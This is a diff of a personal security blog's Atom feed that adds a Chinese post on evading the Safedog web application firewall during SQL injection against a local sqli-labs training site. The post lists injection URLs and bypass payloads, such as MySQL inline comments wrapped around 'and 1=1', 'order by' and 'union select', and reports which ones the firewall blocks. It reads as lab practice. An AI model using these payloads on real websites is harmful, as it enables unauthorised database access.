@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="OneHone.github.io/"/>
-  <updated>2018-08-03T08:07:53.380Z</updated>
+  <updated>2018-09-06T11:48:55.554Z</updated>
   <id>OneHone.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>bypass最新版安全狗</title>
+    <link href="OneHone.github.io/2018/09/06/bypass%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97/"/>
+    <id>OneHone.github.io/2018/09/06/bypass最新版安全狗/</id>
+    <published>2018-09-06T09:44:57.000Z</published>
+    <updated>2018-09-06T11:48:55.554Z</updated>
+    
+    <content type="html"><![CDATA[<p>AKA<br><a id="more"></a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>环境：win7x64+phpstudy+安全狗apache版 v4.0<br>站点：sqli-labs<br><img src="/images/bypass最新版安全狗/1.PNG" alt=""></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Mysql 注释符：<code># , -- , /*...*/</code><br>Mysql 空白字符：<code>%09,%0a,%0b,%0c,%0d,%20,%a0</code></p><h3 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 and 1=1</h3><p>首先判断是否有注入点：<br>正常情况：<a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and 1=1 %23 <font color="#dd0000">(安全狗拦截)</font><br>把<code>and 1=1</code>拆分：<br><a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and %23 <font color="#00dd00">(安全狗不拦截)</font><br>所以要把<code>and</code>和<code>1=1</code>当成两部分，在它们之间进行干扰。经过一番测试用<code>/*!..*/</code>既然绕过<br>payload:<code>/*!..*/</code>（在星号后加惊叹号，那么此解释里的语句将被执行）<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; and /*!1=1*/ %23</code> <font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/2.PNG" alt=""></p><h3 id="绕过-order-by"><a href="#绕过-order-by" class="headerlink" title="绕过 order by"></a>绕过 order by</h3><p>正常情况：<a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> order by 1,2,3 %23 <font color="#dd0000">(安全狗拦截)</font><br><a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> order by  %23 <font color="#00dd00">(安全狗不拦截)</font><br>所以把<code>order by</code>和<code>1,2,3,x</code>当成两部分，继续干扰。用刚刚的思路<code>/*!..*/</code>绕过<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; order by /*!1,2,3*/ %23</code><font color="#00dd00">(安全狗不拦截)</font><br><img src="/images/bypass最新版安全狗/3.PNG" alt=""></p><h3 id="绕过-union-select"><a href="#绕过-union-select" class="headerlink" title="绕过 union select"></a>绕过 union select</h3><p>测试:<a href="http://192.11.22.55/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.11.22.55/sqli/Less-1/?id=-1&#39;</a> UNION SELECT %23 <font color="#dd0000">(安全狗拦截)</font><br>尝试之前的思路<code>union /*!select*/1,2,3</code><font color="#dd0000">(安全狗拦截)</font><br>多次测试之后发现，需要在<code>union</code>和<code>select</code>之间进行干扰，当时这里绕了很久，没绕过去，但总感觉能弄出来。好吧，弄久了没啥灵感就去网上搜搜思路。<br>看到了篇今年5月份的帖子<br><img src="/images/bypass最新版安全狗/4.PNG" alt=""><br>payload:<code>e66union(/*(x/*–*\/)*/select1,2)</code><br>结果不出意外被杀了<br><img src="/images/bypass最新版安全狗/5.PNG" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;AKA&lt;br&gt;
+    
+    </summary>
+    
+      <category term="bypass" scheme="OneHone.github.io/categories/bypass/"/>
+    
+    
+      <category term="安全狗" scheme="OneHone.github.io/tags/%E5%AE%89%E5%85%A8%E7%8B%97/"/>
+    
+  </entry>
   
   <entry>
     <title>某站点的简单测试</title>
